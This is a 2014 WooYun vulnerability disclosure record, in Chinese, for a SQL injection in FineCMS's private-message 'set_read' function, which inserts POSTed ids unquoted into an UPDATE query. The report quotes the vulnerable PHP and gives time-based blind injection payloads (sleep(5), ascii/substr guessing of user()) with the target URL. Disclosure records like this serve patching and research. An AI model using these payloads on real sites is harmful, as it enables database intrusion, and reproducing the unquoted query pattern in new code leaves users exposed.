{"id": 50721, "wybug_id": "wooyun-2014-077047", "wybug_title": " FineCMS 最新版sql注入一枚(无防御)", "wybug_corp": "dayrui.com", "wybug_author": "menmen519", "wybug_date": "2014-09-23 11:51", "wybug_open_date": "2014-12-22 11:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述：  FineCMS 最新版sql注入一枚 厂商不会又说6月份已经修复吧,我说了这只是一个开始.............................................................................................. 详细说明：  直接看代码：member/controllers/pm.php:(lines：27-37)：\npublic function index() {\t\t\t\tif (IS_POST) {\t\t\tif ($this->input->post('action') == 'read') {\t\t\t\t$this->pm_model->set_read($this->uid, $this->input->post('ids'));\t\t\t\texit(dr_json(1, lang('000')));\t\t\t} else {\t\t\t\t$this->pm_model->deletes($this->uid, $this->input->post('ids'));\t\t\t\texit(dr_json(1, lang('000')));\t\t\t}\t\t}\n发现了没有这里有一行:$this->pm_model->set_read($this->uid, $this->input->post('ids'));跟进去看一下:pm_modle.php(lines:150-190):\npublic function set_read($uid, $ids) {\t\t\tif (!$ids) {            return NULL;        }\t\tforeach ($ids as $plid) {\t\t\techo \"UPDATE \".$this->db->dbprefix('pm_members').\" SET isnew=0 WHERE plid=$plid AND uid=$uid AND isnew=1\";\t\t\t$this->db\t\t\t\t ->query(\"UPDATE \".$this->db->dbprefix('pm_members').\" SET isnew=0 WHERE plid=$plid AND uid=$uid AND isnew=1\");\t\t}\t}\n这里如果ids是数组的之家查询，并没有添加单引号，那么这里面可构造的就多了，并且与gpc一点关系都没有我们看一下payload：url:http://finecmstest.com/member/index.php?c=pm&m=indexpostdata:ids[]=sleep(5)&action=read执行后 发现延5秒执行 ，我们在更改一下payloadpostdata:ids[]=if(ascii(substr(user(),1,1))=$NUM,sleep(if(1,5,1))&action=read这里的$NUM就是我们的参数，一直可以猜测表名，这里也可以通过sqlmap去跑 因为没有任何防御ok.....................   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-23 11:58 厂商回复： 这个文件6月份没有动过啊 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-23 12:47 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  15rank。厂商换人了么。。    \n     2014-09-23 13:02 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  结果wooyun给了一个小厂商  感觉不应该啊 厂商被wooyun忽视了    \n     2014-09-27 16:08 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  @menmen519 是原先那个漏洞没修复的吧- -    \n     2014-09-27 17:03 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Sogili 不知道啊    \n     2014-11-16 14:48 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  看来是换人了。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}